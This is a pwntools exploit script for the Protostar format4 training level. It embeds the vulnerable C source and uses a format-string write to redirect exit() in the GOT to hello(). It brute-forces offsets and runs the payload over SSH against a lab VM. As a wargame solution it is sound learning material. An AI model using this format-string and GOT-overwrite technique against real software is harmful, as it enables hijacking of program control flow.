#!/usr/bin/env python3
from pwn import *
context.update(arch='i386', os='linux')
context.bits =32
exe = '/opt/protostar/bin/format4'

'''
```
1#include <stdlib.h>
2#include <unistd.h>
3#include <stdio.h>
4#include <string.h>
5
6int target;
7
8void hello()
9{
10  printf("code execution redirected! you win\n");
11  _exit(1);
12}
13
14void vuln()
15{
16  char buffer[512];
17
18  fgets(buffer, sizeof(buffer), stdin);
19
20  printf(buffer);
21
22  exit(1);  
23}
24
25int main(int argc, char **argv)
26{
27  vuln();
28}
```
We can see that `exit()` is called on line 22. This function resides in the GOT table
which is writable so we will re-route the code flow by overwritting the value at 
`exit()` with the address of `hello()`
'''
dst = 0x08049724 # address of exit
val = 0x080484b4 # address of hello

def getOffset():
    egg = 'AAAA'
    offset = 1
    s = ssh(host='192.168.12.128', user='user', password='user')
    while offset < 6000:
        context.log_level = 'error'
        c = int(offset)
        payload = egg + '%p'*c+'%p'
        sh = s.run(exe)
        sh.sendline(payload)
        result = sh.recvS()
        if '41414141' in result:
            context.log_level = 'info'
            log.info(payload)
            log.success('offset={}, result={}'.format(offset, result))
            context.log_level = 'error'
            break
        offset += 1
    s.close()


'''
user@protostar:/opt/protostar/bin$ objdump -t ./format2 | grep target
080496e4 g     O .bss   00000004              target
'''
def findOffset(lower=0, upper=8):
    foundRes = False
    b = log.progress("bytesWritten")
    o = log.progress("offset")
    context.log_level = 'error'
    result = ''
    bingo = 'you win'

    s = ssh(host='192.168.12.128', user='user', password='user')
    for bytesWritten in range(lower, upper):
        for offset in range(lower, upper):
            payload = fmtstr_payload(offset, {dst: val}, write_size='byte', numbwritten=bytesWritten)
            context.log_level = 'info'
            b.status(str(bytesWritten))
            o.status(str(offset))
            context.log_level = 'error'
            sh = s.run(exe)
            sh.sendline(payload)
            result = sh.recvS()
            if bingo in result:
                context.log_level = 'info'
                log.info(payload)
                log.success('offset={}, bytesWritten={}, result={}'.format(offset, bytesWritten, result))
                context.log_level = 'error'
                s.close()
                return offset, bytesWritten
    s.close()

def exploit(offset, bytesWritten):
    context.log_level = 'info'
    log.info('Executing exploit')
    s = ssh(host='192.168.12.128', user='user', password='user')
    payload = fmtstr_payload(offset, {dst: val}, write_size='byte', numbwritten=bytesWritten)
    sh = s.run(exe)
    log.info(payload)
    sh.sendline(payload)
    result = sh.recvS()
    print(result)
    s.close()

#offset, bytesWritten = findOffset(0, 5000)
bytesWritten = 0
offset = 4
exploit(offset, bytesWritten)
